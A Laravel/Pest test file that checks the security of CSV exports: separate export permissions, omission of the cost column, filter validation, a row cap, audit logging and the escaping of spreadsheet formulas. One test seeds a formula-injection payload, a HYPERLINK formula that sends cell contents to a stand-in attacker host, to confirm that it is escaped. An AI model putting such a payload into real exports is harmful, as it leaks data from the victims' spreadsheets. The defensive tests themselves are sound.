<?php

declare(strict_types=1);

use App\Authorization\Role;
use App\Domain\Export\CsvExport;
use App\Http\Resources\ProductResource;
use App\Models\ActivityLog;
use App\Models\Customer;
use App\Models\Product;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Testing\TestResponse;

/*
|--------------------------------------------------------------------------
| Export security
|--------------------------------------------------------------------------
|
| SECURITY.md §9 and §15.11-13. Export is the highest-value target in the
| system: one request can retrieve the entire customer and margin picture, and
| unlike a screen the result leaves the building as a file.
|
*/

function csvBody(TestResponse $response): string
{
    ob_start();
    $response->baseResponse->sendContent();

    return (string) ob_get_clean();
}

/* -------------------------------------------------------------------------- */
/* The export ability is separate from the view ability */
/* -------------------------------------------------------------------------- */

it('refuses an export to a role that can see the screen but not export it', function (): void {
    // Staff hold products.view and no export ability of any kind.
    $staff = User::factory()->role(Role::Staff)->create();
    Product::factory()->count(2)->create();

    $this->actingAs($staff)->getJson('/api/v1/products')->assertOk();
    $this->actingAs($staff)->get('/api/v1/products/export')->assertForbidden();
});

it('allows an export to a role holding the export ability', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();
    Product::factory()->count(2)->create();

    $this->actingAs($analyst)
        ->get('/api/v1/products/export')
        ->assertOk()
        ->assertHeader('content-type', 'text/csv; charset=UTF-8');
});

/* -------------------------------------------------------------------------- */
/* Redaction is inherited from the resource, not reimplemented */
/* -------------------------------------------------------------------------- */

it('writes the cost column for a role that may see cost', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();
    Product::factory()->priced(100.0000, 40.0000)->create();

    $body = csvBody($this->actingAs($analyst)->get('/api/v1/products/export')->assertOk());

    expect($body)->toContain('Cost')->and($body)->toContain('40.0000');
});

/*
 * The mechanism, tested directly on the exporter.
 *
 * No MVP role both exports and is cost-blind — Staff have neither ability,
 * Manager and Analyst have both — so there is no HTTP route that exercises
 * this. That is exactly why it is worth pinning down: the day a role is added
 * that can export without seeing cost, this test is what stops the cost column
 * shipping with it.
 *
 * Note what is asserted: the HEADER is absent, not blanked. A column named
 * "Cost" full of empty cells still tells the reader a cost exists and that
 * they were denied it, which is the leak `mergeWhen` exists to prevent
 * (SECURITY.md §2.3).
 */
it('omits the cost column entirely for a cost-blind reader', function (): void {
    $costBlind = User::factory()->role(Role::Staff)->create();
    Product::factory()->priced(100.0000, 40.0000)->create();

    $request = Request::create('/api/v1/products/export');
    $request->setUserResolver(fn () => $costBlind);

    $response = app(CsvExport::class)->stream(
        query: Product::query()->with(['category', 'inventoryItem']),
        resource: ProductResource::class,
        columns: ['sku' => 'SKU', 'name' => 'Name', 'price' => 'Price', 'cost' => 'Cost'],
        request: $request,
        filename: 'products',
    );

    ob_start();
    $response->sendContent();
    $body = (string) ob_get_clean();

    expect($body)->toContain('SKU,Name,Price')
        ->and($body)->not->toContain('Cost')
        ->and($body)->not->toContain('40.0000');
});

it('writes only the columns the resource produced', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();
    Customer::factory()->create(['name' => 'Gulf Trading', 'email' => 'accounts@gulf.test']);

    $body = csvBody($this->actingAs($analyst)->get('/api/v1/customers/export')->assertOk());

    expect($body)->toContain('Name,Company,Email')
        ->and($body)->toContain('Gulf Trading')
        ->and($body)->toContain('accounts@gulf.test');
});

/* -------------------------------------------------------------------------- */
/* Formula injection */
/* -------------------------------------------------------------------------- */

it('escapes a cell that would execute as a formula in a spreadsheet', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();

    Customer::factory()->create([
        'name' => '=HYPERLINK("http://attacker.test/?d="&A1,"Invoice")',
        'email' => 'ok@gulf.test',
    ]);

    $body = csvBody($this->actingAs($analyst)->get('/api/v1/customers/export')->assertOk());

    // Leading apostrophe forces text interpretation in Excel, LibreOffice and
    // Sheets alike.
    expect($body)->toContain("'=HYPERLINK")
        ->and($body)->not->toMatch('/(^|,|")=HYPERLINK/m');
});

/* -------------------------------------------------------------------------- */
/* Scope, cap and audit */
/* -------------------------------------------------------------------------- */

it('applies the same filters as the screen', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();

    Customer::factory()->create(['name' => 'Gulf Trading']);
    Customer::factory()->create(['name' => 'Delta Logistics']);

    $body = csvBody(
        $this->actingAs($analyst)
            ->get('/api/v1/customers/export?filter[search]=Gulf')
            ->assertOk(),
    );

    expect($body)->toContain('Gulf Trading')
        ->and($body)->not->toContain('Delta Logistics');
});

it('rejects an unknown filter key rather than exporting everything', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();
    Customer::factory()->count(3)->create();

    // Silently ignoring it would hand back the full table while the caller
    // believed their filter applied — the worst possible failure for an
    // export (SECURITY.md §8).
    $this->actingAs($analyst)
        ->getJson('/api/v1/customers/export?filter[nonsense]=1')
        ->assertStatus(422);
});

it('refuses rather than truncates when the row cap is exceeded', function (): void {
    /*
     * Refusing is the deliberate choice, and this is the test that holds it in
     * place. A truncated CSV is indistinguishable from a complete one once it
     * is a file on a desktop, and the person who opens it will total a column
     * and act on the answer.
     *
     * The cap is lowered to two rather than seeding fifty thousand rows: the
     * code path is identical and the suite stays usable, which is the whole
     * reason the limit is configuration rather than a constant.
     */
    config()->set('export.max_rows', 2);

    $analyst = User::factory()->role(Role::Analyst)->create();
    Customer::factory()->count(3)->create();

    $this->actingAs($analyst)
        ->getJson('/api/v1/customers/export')
        ->assertStatus(422)
        ->assertJsonPath('code', 'validation.failed');
});

it('ships a cap that matches the documented limit', function (): void {
    expect(config('export.max_rows'))->toBe(50_000);
});

it('audits every export with its filters and row count', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();
    Customer::factory()->count(3)->create();

    ActivityLog::query()->delete();

    $this->actingAs($analyst)
        ->get('/api/v1/customers/export?filter[is_active]=1')
        ->assertOk();

    $log = ActivityLog::query()->where('action', 'export.generated')->latest('id')->first();

    expect($log)->not->toBeNull()
        ->and($log->user_id)->toBe($analyst->id)
        ->and($log->context['resource'])->toBe('customers')
        ->and($log->context['rows'])->toBe(3)
        // Reproducibility: an investigator must be able to run the same
        // export and see what left the building.
        ->and($log->context['filters'])->toBe(['is_active' => '1']);
});

it('audits an export of the audit log itself', function (): void {
    $owner = User::factory()->role(Role::Owner)->create();
    Customer::factory()->count(2)->create();

    $this->actingAs($owner)->get('/api/v1/activity/export')->assertOk();

    $log = ActivityLog::query()->where('action', 'export.generated')->latest('id')->first();

    // The one export a person covering their tracks would most want, and it
    // leaves a mark in the very table it reads.
    expect($log)->not->toBeNull()
        ->and($log->context['resource'])->toBe('activity-log');
});

it('sends a UTF-8 BOM so non-Latin names survive Excel on Windows', function (): void {
    $analyst = User::factory()->role(Role::Analyst)->create();
    Customer::factory()->create(['name' => 'شركة الخليج للتجارة']);

    $body = csvBody($this->actingAs($analyst)->get('/api/v1/customers/export')->assertOk());

    expect(substr($body, 0, 3))->toBe("\xEF\xBB\xBF")
        ->and($body)->toContain('شركة الخليج للتجارة');
});
